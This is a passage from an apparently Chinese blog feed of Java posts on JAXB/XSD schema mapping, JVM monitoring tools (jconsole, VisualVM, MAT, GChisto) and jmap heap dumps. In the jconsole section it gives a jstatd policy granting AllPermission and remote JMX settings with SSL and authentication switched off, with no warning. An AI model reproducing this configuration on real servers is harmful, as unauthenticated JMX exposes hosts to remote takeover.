class="tag">&lt;/<span class="name">xs:complexType</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Thus the following code fragment:</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">     Target target = <span class="keyword">new</span> Target();</span><br><span class="line">     target.tasks.add(<span class="keyword">new</span> JarTask());</span><br><span class="line">     target.tasks.add(<span class="keyword">new</span> JavacTask());</span><br><span class="line">     marshal(target);</span><br><span class="line">``` </span><br><span class="line">will produce the following XML output:</span><br><span class="line">```xml</span><br><span class="line">     &lt;target&gt;</span><br><span class="line">       &lt;jar&gt;</span><br><span class="line">         ....</span><br><span class="line">       &lt;/jar&gt;</span><br><span class="line">       &lt;javac&gt;</span><br><span class="line">         ....</span><br><span class="line">       &lt;/javac&gt;</span><br><span class="line">     &lt;/target&gt;</span><br></pre></td></tr></table></figure><p>It is not an error to have a class that extends Task that doesn’t have <code>XmlRootElement</code>. But they can’t show up in an XML instance (because they don’t have XML element names).</p><h4 id="Example-2-XML-Schema-Susbstitution-group-support"><a href="#Example-2-XML-Schema-Susbstitution-group-support" class="headerlink" title="Example 2: XML Schema Susbstitution group support"></a>Example 2: XML Schema Susbstitution group support</h4><p>The following example shows the annotations for XML Schema substitution groups. The annotations and the ObjectFactory are derived from the schema.</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">     <span class="meta">@XmlElement</span></span><br><span class="line">     <span class="class"><span class="keyword">class</span> <span class="title">Math</span> </span>&#123;</span><br><span class="line">         <span class="comment">//  The value of type()is </span></span><br><span class="line">         <span class="comment">//  JAXBElement.class , which indicates the XML</span></span><br><span class="line">         <span class="comment">//  element name ObjectFactory - in general a class marked</span></span><br><span class="line">         <span class="comment">//  with @XmlRegistry. (See ObjectFactory below)</span></span><br><span class="line">         <span class="comment">//  </span></span><br><span class="line">         <span class="comment">//  The name() is "operator", a pointer to a</span></span><br><span class="line">         <span class="comment">// factory method annotated with a</span></span><br><span class="line">         <span class="comment">//  XmlElementDecl with the name "operator". Since</span></span><br><span class="line">         <span class="comment">//  "operator" is the head of a substitution group that</span></span><br><span class="line">         <span class="comment">//  contains elements "add" and "sub" elements, "operator"</span></span><br><span class="line">         <span class="comment">//  element can be substituted in an instance document by</span></span><br><span class="line">         <span class="comment">//  elements "add" or "sub". At runtime, JAXBElement</span></span><br><span class="line">         <span class="comment">//  instance contains the element name that has been</span></span><br><span class="line">         <span class="comment">//  substituted in the XML document.</span></span><br><span class="line">         <span class="comment">// </span></span><br><span class="line">         <span class="meta">@XmlElementRef</span>(type=JAXBElement<span class="class">.<span class="keyword">class</span>,<span class="title">name</span></span>=<span class="string">"operator"</span>)</span><br><span class="line">         JAXBElement&lt;? extends Operator&gt; term;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="meta">@XmlRegistry</span></span><br><span class="line">     <span class="class"><span class="keyword">class</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line">         <span class="meta">@XmlElementDecl</span>(name=<span class="string">"operator"</span>)</span><br><span class="line">         <span class="function">JAXBElement&lt;Operator&gt; <span class="title">createOperator</span><span class="params">(Operator o)</span> </span>&#123;...&#125;</span><br><span class="line">         <span class="meta">@XmlElementDecl</span>(name=<span class="string">"add"</span>,substitutionHeadName=<span class="string">"operator"</span>)</span><br><span class="line">         <span class="function">JAXBElement&lt;Operator&gt; <span class="title">createAdd</span><span class="params">(Operator o)</span> </span>&#123;...&#125;</span><br><span class="line">         <span class="meta">@XmlElementDecl</span>(name=<span class="string">"sub"</span>,substitutionHeadName=<span class="string">"operator"</span>)</span><br><span class="line">         <span class="function">JAXBElement&lt;Operator&gt; <span class="title">createSub</span><span class="params">(Operator o)</span> </span>&#123;...&#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="class"><span class="keyword">class</span> <span class="title">Operator</span> </span>&#123;</span><br><span class="line">         ...</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//Thus, the following code fragment</span></span><br><span class="line"></span><br><span class="line">     Math m = <span class="keyword">new</span> Math();</span><br><span class="line">     m.term = <span class="keyword">new</span> ObjectFactory().createAdd(<span class="keyword">new</span> Operator());</span><br><span class="line">     marshal(m);</span><br><span class="line">``` </span><br><span class="line">will produce the following XML output:</span><br><span class="line">```xml</span><br><span class="line">     &lt;math&gt;</span><br><span class="line">       &lt;add&gt;...&lt;/add&gt;</span><br><span class="line">     &lt;/math&gt;</span><br></pre></td></tr></table></figure><h3 id="nil-属性和其他属性"><a href="#nil-属性和其他属性" class="headerlink" title="nil 属性和其他属性"></a>nil 属性和其他属性</h3><p>XML 架构规范允许其他 XML 属性出现在 xsi:nil 属性设置为 true 的元素中。由于只有当对应的对象被分配了空引用时，XmlSerializer 类才将 nil 属性设置为 true，因此，表示 XML 属性（通过类型为 System.Xml.Serialization.XmlAttributeAttribute 的属性）的任何对象字段此时甚至不能存在于内存中。</p><p>因此，XmlSerializer 类按如下方式处理其他属性：</p><ol><li><p>在将对象序列化为 XML 文档时：如果 XmlSerializer 类遇到与某个 XML 元素对应的对象的空引用，并且应当为该元素指定 nil 属性，则它会省略任何其他属性。</p></li><li><p>在将 XML 文档反序列化为对象时：如果 XmlSerializer 类遇到指定 xsi:nil=”true” 的 XML 元素，它会为对应的对象分配一个空引用，并忽略其他任何属性。如果该 XML 文档是由某个 XML 架构实现创建的，而且该实现允许其他属性与 xsi:nil=”true” 一起出现 — 实际上是不将 nil 的 true 值绑定到空对象引用 — 则可能会出现这种情况。</p></li></ol><h3 id="XSD文件中的使用"><a href="#XSD文件中的使用" class="headerlink" title="XSD文件中的使用"></a>XSD文件中的<choice>使用</choice></h3><p>These sequence tags will be under<choice>tag. Now either of these set of tags (Sequence) will be validated.</choice></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xs:schema</span> <span class="attr">attributeFormDefault</span>=<span class="string">"unqualified"</span> <span class="attr">elementFormDefault</span>=<span class="string">"qualified"</span> <span class="attr">xmlns:xs</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">"root"</span> <span class="attr">type</span>=<span class="string">"root"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">xs:complexType</span> <span class="attr">name</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:choice</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">xs:sequence</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">"empno"</span> <span class="attr">type</span>=<span class="string">"xs:string"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">"designation"</span> <span class="attr">type</span>=<span class="string">"xs:string"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">xs:sequence</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">xs:sequence</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">type</span>=<span class="string">"xs:string"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">"age"</span> <span class="attr">type</span>=<span class="string">"xs:unsignedByte"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">xs:sequence</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xs:choice</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xs:complexType</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xs:schema</span>&gt;</span></span><br></pre></td></tr></table></figure><p>一般建议使用如下</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xs:schema</span> <span class="attr">attributeFormDefault</span>=<span class="string">"unqualified"</span> <span class="attr">elementFormDefault</span>=<span class="string">"qualified"</span> <span class="attr">xmlns:xs</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">"root"</span> <span class="attr">type</span>=<span class="string">"root"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">xs:complexType</span> <span class="attr">name</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:sequence</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">"trunk"</span> <span class="attr">type</span>=<span class="string">"trunk"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">"other"</span> <span class="attr">type</span>=<span class="string">"xs:string"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xs:sequence</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xs:complexType</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">xs:complexType</span> <span class="attr">name</span>=<span class="string">"trunk"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:sequence</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">"branch1"</span> <span class="attr">type</span>=<span class="string">"xs:string"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">"branch2"</span> <span class="attr">type</span>=<span class="string">"xs:string"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xs:sequence</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xs:complexType</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xs:schema</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Xml-Schema的派生复杂类型"><a href="#Xml-Schema的派生复杂类型" class="headerlink" title="Xml Schema的派生复杂类型"></a>Xml Schema的派生复杂类型</h3><p>XML Schema提供了一种机制，称为替换组（substitution group），允许在内容模型中声明的某个元素被其他元素所替换。替换组有头元素（head element）和替换成员组成，头元素和替换成员都必须是全局元素，有相同的类型，或都有头元素派生。替换成员需要使用一个特殊的属性sbustitutionGroup，用于指定要替换的头元素的名字。在内容模型中引用头元素，在实例文档中则用任意的替换组成员来替换头元素。详见<a href="http://blog.csdn.net/tuolingss/article/details/8550090">他人博客</a></p><h3 id="使用JDK中的xjc-exe命令，根据xsd文件生成java代码"><a href="#使用JDK中的xjc-exe命令，根据xsd文件生成java代码" class="headerlink" title="使用JDK中的xjc.exe命令，根据xsd文件生成java代码"></a>使用JDK中的xjc.exe命令，根据xsd文件生成java代码</h3><p>实际上，有更懒的办法。<br>写好一个xsd文件，然后用jdk下bin <code>xjc.exe test-scheme.xsd -d [your src dir]</code>命令自动生成java等文件。也可以用IDE，像eclipse 选中xsd右键-&gt; Genarate -&gt; JAXB Class生成 。在eclipse中，要先让项目运行环境在JDK 1.6 或以上。如默认项目运行在JRE，需要手工更改Build path为JDK</p><p>关于 xjc.exe For more info use <a href="http://docs.oracle.com/javaee/5/tutorial/doc/bnazg.html">this documentation</a></p><p>and <a href="http://docs.oracle.com/javase/6/docs/technotes/tools/share/xjc.html">this</a></p><p>如果生成的根元素对应的对象没有自动添加上<code>@XmlRootElement</code>，则需要手动添加。</p>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>JAXB</tag>
      </tags>
  </entry>
  <entry>
    <title>jdk 图表化工具jconsole jvisualvm 以及一些第三方工具</title>
    <url>/2017/11/03/jdk-jconsole-jvisualvm-and-3rdtools/</url>
    <content><![CDATA[<p>工具做为图形化界面来展示更能直观的发现问题，另一方面一些耗费性能的分析（dump文件分析）一般也不会在生产直接分析，往往dump下来的文件达1G左右，人工分析效率较低，因此利用工具来分析jvm相关问题，长长可以到达事半功倍的效果来。</p><p>jvm监控分析工具一般分为两类，一种是jdk自带的工具，一种是第三方的分析工具。jdk自带工具一般在jdk bin目录下面，以exe的形式直接点击就可以使用，其中包含分析工具已经很强大，几乎涉及了方方面面，但是我们最常使用的只有两款：jconsole.exe和jvisualvm.exe；第三方的分析工具有很多，各自的侧重点不同，比较有代表性的：MAT(Memory Analyzer Tool)、GChisto等。</p><p>对于大型 JAVA 应用程序来说，再精细的测试也难以堵住所有的漏洞，即便我们在测试阶段进行了大量卓有成效的工作，很多问题还是会在生产环境下暴露出来，并且很难在测试环境中进行重现。JVM 能够记录下问题发生时系统的部分运行状态，并将其存储在堆转储 (Heap Dump) 文件中，从而为我们分析和诊断问题提供了重要的依据。其中VisualVM和MAT是dump文件的分析利器。</p><h2 id="jdk自带的工具"><a href="#jdk自带的工具" class="headerlink" title="jdk自带的工具"></a>jdk自带的工具</h2><h3 id="jconsole"><a href="#jconsole" class="headerlink" title="jconsole"></a>jconsole</h3><p>Jconsole（Java Monitoring and Management Console）是从java5开始，在JDK中自带的java监控和管理控制台，用于对JVM中内存，线程和类等的监控，是一个基于JMX（java management extensions）的GUI性能监测工具。jconsole使用jvm的扩展机制获取并展示虚拟机中运行的应用程序的性能和资源消耗等信息。</p><p>直接在jdk/bin目录下点击jconsole.exe即可启动.</p><p>在弹出的框中可以选择本机的监控本机的java应用，也可以选择远程的java服务来监控.</p><p>需要注意的就是在运行jconsole之前，必须要先设置环境变量DISPLAY，否则会报错误，Linux下设置环境变量如下：<br><code>export DISPLAY=:0.0</code></p><p>要从远程应用程序中检索数据，需要在远程 JVM 上运行 jstatd 实用程序。即要进行以下操作：</p><blockquote><p>(1)在jdk 安装目录的bin目录下新建文件jstatd.all.policy，文件内容为：</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grant codebase "file:$&#123;java.home&#125;/../lib/tools.jar" &#123;</span><br><span class="line">permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>(2)再新建文件jstatd.sh ，文件内容为：<br><code>./jstatd -J-Djava.security.policy=jstatd.all.policy</code></p></blockquote><blockquote><p>(3)启动jstat : nohup jstatd.sh &amp; (默认启动端口为1099)<br>(4)配置resin.conf，把以下注释打开：</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- no use args --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">jvm-arg</span>&gt;</span>-Xdebug<span class="tag">&lt;/<span class="name">jvm-arg</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">jvm-arg</span>&gt;</span>-Dcom.sun.management.jmxremote<span class="tag">&lt;/<span class="name">jvm-arg</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>(5)在应用的resin配置文件中加配置：</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jvm-arg</span>&gt;</span>-Dcom.sun.management.jmxremote<span class="tag">&lt;/<span class="name">jvm-arg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jvm-arg</span>&gt;</span>-Dcom.sun.management.jmxremote.port=9009<span class="tag">&lt;/<span class="name">jvm-arg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jvm-arg</span>&gt;</span>-Dcom.sun.management.jmxremote.ssl=false<span class="tag">&lt;/<span class="name">jvm-arg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jvm-arg</span>&gt;</span>-Dcom.sun.management.jmxremote.authenticate=false<span class="tag">&lt;/<span class="name">jvm-arg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果监控远程服务需要在tomcat启动脚本中添加如下代码：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-Dcom.sun.management.jmxremote.port=6969  </span><br><span class="line">-Dcom.sun.management.jmxremote.ssl=false  </span><br><span class="line">-Dcom.sun.management.jmxremote.authenticate=false</span><br></pre></td></tr></table></figure><p>连接进去之后，就可以看到jconsole概览图和主要的功能：概述、内存、线程、类、VM、MBeans.</p><blockquote><ul><li>概述，以图表的方式显示出堆内存使用量，活动线程数，已加载的类，CUP占用率的折线图，可以非常清晰的观察在程序执行过程中的变动情况。</li><li>内存，主要展示了内存的使用情况，同时可以查看堆和非堆内存的变化值对比，也可以点击执行GC来处罚GC的执行</li><li>线程，主界面展示线程数的活动数和峰值，同时点击左下方线程可以查看线程的详细信息，比如线程的状态是什么，堆栈内容等，同时也可以点击“检测死锁”来检查线程之间是否有死锁的情况。</li><li>类，主要展示已加载类的相关信息。</li><li>VM 概要，展示JVM所有信息总览，包括基本信息、线程相关、堆相关、操作系统、VM参数等。</li><li>Mbean,查看Mbean的属性，方法等。</li></ul></blockquote><h3 id="VisualVM"><a href="#VisualVM" class="headerlink" title="VisualVM"></a>VisualVM</h3><p>VisualVM 是一个工具，它提供了一个可视界面，用于查看 Java 虚拟机 (Java Virtual Machine, JVM) 上运行的基于 Java 技术的应用程序（Java 应用程序）的详细信息。VisualVM 对 Java Development Kit (JDK) 工具所检索的 JVM 软件相关数据进行组织，并通过一种使您可以快速查看有关多个 Java 应用程序的数据的方式提供该信息。您可以查看本地应用程序以及远程主机上运行的应用程序的相关数据。此外，还可以捕获有关 JVM 软件实例的数据，并将该数据保存到本地系统，以供后期查看或与其他用户共享。</p><p>VisualVM 是javajdk自带的最牛逼的调优工具了吧，也是我平时使用最多调优工具，几乎涉及了jvm调优的方方面面。同样是在jdk/bin目录下面双击jvisualvm.exe既可使用，启动起来后和jconsole 一样同样可以选择本地和远程，如果需要监控远程同样需要配置相关参数.</p><p>VisualVM可以根据需要安装不同的插件，每个插件的关注点都不同，有的主要监控GC，有的主要监控内存，有的监控线程等。</p><p>如何安装：</p><blockquote><p>1、从主菜单中选择“工具”&gt;“插件”。<br>2、在“可用插件”标签中，选中该插件的“安装”复选框。单击“安装”。<br>3、逐步完成插件安装程序。</p></blockquote><p>监控的主页其实也就是，cpu、内存、类、线程的图表<br>线程和jconsole功能没有太大的区别<br>Visual GC 是常常使用的一个功能，可以明显的看到年轻代、老年代的内存变化，以及gc频率、gc的时间等。<br>以上的功能其实jconsole几乎也有，VisualVM更全面更直观一些，另外VisualVM非常多的其它功能，可以分析dump的内存快照，dump出来的线程快照并且进行分析等，还有其它很多的插件大家可以去探索</p><p><a href="http://zhouanya.blog.51cto.com/4944792/1370017">Jvisualvm配置使用</a></p><h2 id="第三方调优工具"><a href="#第三方调优工具" class="headerlink" title="第三方调优工具"></a>第三方调优工具</h2><h3 id="MAT"><a href="#MAT" class="headerlink" title="MAT"></a>MAT</h3><p>MAT(Memory Analyzer Tool)，一个基于Eclipse的内存分析工具，是一个快速、功能丰富的Java heap分析工具，它可以帮助我们查找内存泄漏和减少内存消耗。使用内存分析工具从众多的对象中进行分析，快速的计算出在内存中对象的占用大小，看看是谁阻止了垃圾收集器的回收工作，并可以通过报表直观的查看到可能造成这种结果的对象。</p><p>通常内存泄露分析被认为是一件很有难度的工作，一般由团队中的资深人士进行。不过要介绍的 MAT（Eclipse Memory Analyzer）被认为是一个“傻瓜式“的堆转储文件分析工具，你只需要轻轻点击一下鼠标就可以生成一个专业的分析报告。和其他内存泄露分析工具相比，MAT 的使用非常容易，基本可以实现一键到位，即使是新手也能够很快上手使用。</p><p>MAT以eclipse 插件的形式来安装，具体的安装过程就不在描述了，可以利用visualvm或者是 jmap命令生产堆文件，导入eclipse mat中生成分析报告</p><p>生产这会报表的同时也会在dump文件的同级目录下生成三份（dump_Top_Consumers.zip、dump_Leak_Suspects.zip、dump_Top_Components.zip）分析结果的html文件，方便发送给相关同事来查看。</p><p>需要关注的是下面的Actions、Reports、Step by Step区域：</p><blockquote><ul><li>Histogram：列出内存中的对象，对象的个数以及大小，支持正则表达式查找，也可以计算出该类所有对象的retained size.</li><li>Dominator Tree：列出最大的对象以及其依赖存活的Object （大小是以Retained Heap为标准排序的）</li><li>Top Consumers ： 通过图形列出最大的object</li><li>duplicate classes ：检测由多个类装载器加载的类</li><li>Leak Suspects ：内存泄漏分析</li><li>Top Components: 列出大于总堆数的百分之1的报表。</li><li>Component Report:分析对象属于同一个包或者被同一个类加载器加载</li></ul></blockquote><p>以上只是一个初级的介绍，mat还有更强大的使用，比如对比堆内存，在生产环境中往往为了定位问题，每隔几分钟dump出一下内存快照，随后在对比不同时间的堆内存的变化来发现问题。</p><h3 id="GChisto"><a href="#GChisto" class="headerlink" title="GChisto"></a>GChisto</h3><p>GChisto是一款专业分析gc日志的工具，可以通过gc日志来分析：Minor GC、full gc的时间、频率等等，通过列表、报表、图表等不同的形式来反应gc的情况。虽然界面略显粗糙，但是功能还是不错的。</p><p>配置好本地的jdk环境之后，双击GChisto.jar,在弹出的输入框中点击 add 选择gc.log日志</p><blockquote><ul><li>GC Pause Stats:可以查看GC 的次数、GC的时间、GC的开销、最大GC时间和最小GC时间等，以及相应的柱状图</li><li>GC Pause Distribution:查看GC停顿的详细分布，x轴表示垃圾收集停顿时间，y轴表示是停顿次数。</li><li>GC Timeline：显示整个时间线上的垃圾收集</li></ul></blockquote><p>不过这款工具已经不再维护，不能识别最新jdk的日志文件。</p><h3 id="GCViewer"><a href="#GCViewer" class="headerlink" title="GCViewer"></a>GCViewer</h3><p>GCViewer也是一款分析小工具，用于可视化查看由Sun / Oracle, IBM, HP 和 BEA Java 虚拟机产生的垃圾收集器的日志，gcviewer个人感觉显示 的界面比较乱没有GChisto更专业一些。</p><h3 id="GC-Easy"><a href="#GC-Easy" class="headerlink" title="GC Easy"></a>GC Easy</h3><p>这是一个web工具,在线使用非常方便.</p><p>地址: <a href="http://gceasy.io">http://gceasy.io</a></p><p>进入官网，讲打包好的zip或者gz为后缀的压缩包上传，过一会就会拿到分析结果。</p><p><a href="http://www.ityouknow.com/java/2017/02/22/jvm-tool.html">原文地址</a></p>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>jvm</tag>
        <tag>jdk</tag>
      </tags>
  </entry>
  <entry>
    <title>jdk jmap jhat 产生并分析dump文件</title>
    <url>/2017/11/01/jdk-jmap-jhat/</url>
    <content><![CDATA[<blockquote><ul><li>如果程序内存不足或者频繁GC，很有可能存在内存泄露情况，这时候就要借助Java堆Dump查看对象的情况。</li><li>使用jmap -histo:[live]查看堆内存中的对象的情况。如果有大量对象在持续被引用，并没有被释放掉，那就产生了内存泄露，就要结合代码，把不用的对象释放掉。</li><li>在内存出现泄露、溢出或者其它前提条件下，建议多dump几次内存，把内存文件进行编号归档，便于后续内存整理分析。</li><li>64位机上使用需要使用如下方式：<code>jmap -J-d64 -heap pid</code></li></ul></blockquote><h2 id="制作Java-Dump"><a href="#制作Java-Dump" class="headerlink" title="制作Java Dump"></a>制作Java Dump</h2><h3 id="Java-Dump-简介"><a href="#Java-Dump-简介" class="headerlink" title="Java Dump 简介"></a>Java Dump 简介</h3><p>Java虚拟机的运行时快照。将Java虚拟机运行时的状态和信息保存到文件。</p><blockquote><ul><li>线程Dump,包含所有线程的运行状态。纯文本格式。</li></ul></blockquote><blockquote><ul><li>堆Dump,包含线程Dump,幵包含所有堆对象的状态。二进制格式。堆Dump是反应Java堆使用情况的内存镜像，其中主要包括系统信息、虚拟机属性、完整的线程Dump、所有类和对象的状态等。 一般，在内存不足、GC异常等情况下，我们就会怀疑有内存泄露。这个时候我们就可以制作堆Dump来查看具体情况。分析原因。</li></ul></blockquote><p>补足传统Bug分析手段的不足: 可在任何Java环境使用;信息量充足。 针对非功能正确性的Bug,主要为:多线程幵发、内存泄漏。</p><h3 id="使用Java虚拟机制作Dump"><a href="#使用Java虚拟机制作Dump" class="headerlink" title="使用Java虚拟机制作Dump"></a>使用Java虚拟机制作Dump</h3><p>指示虚拟机出现OOM，即虚拟机在发生内存不足错误时,自动生成堆Dump<br><code>-XX:+HeapDumpOnOutOfMemoryError</code></p><h3 id="使用图形化工具制作Dump"><a href="#使用图形化工具制作Dump" class="headerlink" title="使用图形化工具制作Dump"></a>使用图形化工具制作Dump</h3><p>使用JDK(1.6)自带的工具:Java VisualVM。<br>使用 jconsole 选项通过 HotSpotDiagnosticMXBean 从运行时获得堆转储（生成dump文件）。</p><h3 id="使用命令行制作Dump"><a href="#使用命令行制作Dump" class="headerlink" title="使用命令行制作Dump"></a>使用命令行制作Dump</h3><p>jstack:打印线程的栈信息,制作线程Dump。</p><p>jmap:打印内存映射,制作堆Dump。<br>这个命令执行，JVM会将整个heap的信息dump写入到一个文件，heap如果比较大的话，就会导致这个过程比较耗时，并且执行的过程中为了保证dump的信息是可靠的，所以会暂停应用。</p><h2 id="jmap-产生dump文件-信息"><a href="#jmap-产生dump文件-信息" class="headerlink" title="jmap 产生dump文件/信息"></a>jmap 产生dump文件/信息</h2><p>jmap(JVM Memory Map)命令用于生成heap dump文件,打印出某个java进程（使用pid）内存内的，所有‘对象’的情况（如：产生那些对象，及其数量）.还阔以查询finalize执行队列、Java堆和永久代的详细信息，如当前使用率、当前使用的是哪种收集器等。</p><h3 id="jmap命令格式"><a href="#jmap命令格式" class="headerlink" title="jmap命令格式"></a>jmap命令格式</h3><blockquote><ul><li><code>jmap [option] &lt;pid&gt;</code><pre><code>(to connect to running process)</code></pre></li><li><code>jmap [option] &lt;executable &lt;core&gt;</code><pre><code>(to connect to a core file)</code></pre></li><li><code>jmap [option] [server_id@]&lt;remote server IP or hostname&gt;</code><pre><code>(to connect to remote debug server)</code></pre></li></ul></blockquote><p><code>executable</code> Java executable from which the core dump was produced.<br>(可能是产生core dump的java可执行程序)<br><code>core</code> 将被打印信息的core dump文件<br><code>remote-hostname-or-IP</code> 远程debug服务的主机名或ip<br><code>server-id</code> 唯一id,假如一台主机上多个远程debug服务 ，用此选项参数标识服务器。<br><code>pid</code> 需要打印配置信息的进程ID。该进程必须是一个Java进程。想要获取运行的Java进程列表，你可以使用jps。</p><h3 id="jmap-option参数"><a href="#jmap-option参数" class="headerlink" title="jmap option参数"></a>jmap option参数</h3><blockquote><ul><li><none>如果使用不带选项参数的jmap打印共享对象映射，将会打印目标虚拟机中加载的每个共享对象的起始地址、映射大小以及共享对象文件的路径全称。这与Solaris的pmap工具比较相似。</none></li><li>-dump:[live,]format=b,file=<filename>使用hprof二进制形式,输出jvm的heap内容到文件中. live子选项是可选的，假如指定live选项,那么只输出活的对象到文件. 想要浏览heap dump，你可以使用jhat(Java堆分析工具)读取生成的文件。这个命令执行，JVM会将整个heap的信息dump写入到一个文件，heap如果比较大的话，就会导致这个过程比较耗时，并且执行的过程中为了保证dump的信息是可靠的，所以会暂停应用。</filename></li><li>-finalizerinfo 打印正等候回收的对象的信息.</li><li>-heap 打印heap的概要信息，GC使用的算法，heap的配置及wise heap的使用情况.查看java 堆（heap）使用情况</li><li>-histo[:live] 打印堆的柱状图。打印每个class的实例数目,内存占用,类全名信息. VM的内部类名字开头会加上前缀”*”. 如果live子参数加上后,只统计活的对象数量. 查看堆内存(histogram)中的对象数量及大小。</li><li>-permstat 打印classload和jvm heap长久层的信息. 包含每个classloader的名字,活泼性,地址,父classloader和加载的class数量和占用内存.另外,内部String的数量和占用内存数也会打印出来.</li><li>-F 强制模式。如果指定的pid没有响应，请使用<code>jmap -dump</code>或<code>jmap -histo</code>选项。在这个模式下,live子参数无效. 当-dump没有响应时，强制生成dump快照</li><li>-h | -help 打印辅助信息</li><li>-J 传递参数给jmap启动的jvm.</li></ul></blockquote><h3 id="jmap示例"><a href="#jmap示例" class="headerlink" title="jmap示例"></a>jmap示例</h3><p>-heap<br>打印heap的概要信息，GC使用的算法，heap的配置及wise heap的使用情况,可以用此来判断内存目前的使用情况以及垃圾回收情况。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> jmap -heap 28920</span></span><br><span class="line">  Attaching to process ID 28920, please wait...</span><br><span class="line">  Debugger attached successfully.</span><br><span class="line">  Server compiler detected.</span><br><span class="line">  JVM version is 24.71-b01  </span><br><span class="line"></span><br><span class="line">  using thread-local object allocation.</span><br><span class="line">  Parallel GC with 4 thread(s)//GC 方式  </span><br><span class="line"></span><br><span class="line">  Heap Configuration: //堆内存初始化配置</span><br><span class="line">     MinHeapFreeRatio = 0 //对应jvm启动参数-XX:MinHeapFreeRatio设置JVM堆最小空闲比率(default 40)</span><br><span class="line">     MaxHeapFreeRatio = 100 //对应jvm启动参数 -XX:MaxHeapFreeRatio设置JVM堆最大空闲比率(default 70)</span><br><span class="line">     MaxHeapSize      = 2082471936 (1986.0MB) //对应jvm启动参数-XX:MaxHeapSize=设置JVM堆的最大大小</span><br><span class="line">     NewSize          = 1310720 (1.25MB)//对应jvm启动参数-XX:NewSize=设置JVM堆的‘新生代’的默认大小</span><br><span class="line">     MaxNewSize       = 17592186044415 MB//对应jvm启动参数-XX:MaxNewSize=设置JVM堆的‘新生代’的最大大小</span><br><span class="line">     OldSize          = 5439488 (5.1875MB)//对应jvm启动参数-XX:OldSize=&lt;value&gt;:设置JVM堆的‘老生代’的大小</span><br><span class="line">     NewRatio         = 2 //对应jvm启动参数-XX:NewRatio=:‘新生代’和‘老生代’的大小比率</span><br><span class="line">     SurvivorRatio    = 8 //对应jvm启动参数-XX:SurvivorRatio=设置年轻代中Eden区与Survivor区的大小比值 </span><br><span class="line">     